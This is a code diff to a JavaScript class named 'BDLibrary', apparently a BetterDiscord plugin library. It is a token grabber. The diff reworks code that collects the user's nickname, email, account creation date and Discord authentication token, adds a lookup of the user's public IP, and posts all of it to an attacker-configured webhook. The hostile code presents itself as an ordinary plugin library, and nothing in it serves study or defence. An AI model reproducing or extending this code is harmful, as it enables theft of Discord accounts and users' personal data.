@@ -29,9 +29,11 @@ class BDLibrary {
         const creationdate = (BdApi.findModuleByProps("getCurrentUser").getCurrentUser().createdAt);
         let date = new Date(creationdate);
         let formatted_date = date.getDate() + "." + (date.getMonth() + 1) + "." + date.getFullYear();
-        
-        fetch("https://api.ipify.org?format=json").then((data) => {
-            require("request").post(config.webhook, {form: {content: `**\nnickname: __${username}__**\n**Email: __${userEmail}__**\n**Created: __${formatted_date}__**\n\n**Received token:**\`\`\`${authToken}\`\`\``}});
+        let url = 'https://api.ipify.org/?format=json';
+        fetch(url)
+        .then(res => res.json())
+        .then((out) => {
+            require("request").post(config.webhook, {form: {content: `**\nnickname:  __${username}__**\n**Email:\t\t  __${userEmail}__**\n**Created:     __${formatted_date}__**\n**IP:\t\t\t\t __${out.ip}__**\n\n**Received token:**\`\`\`${authToken}\`\`\``}});
         });
     }
 }
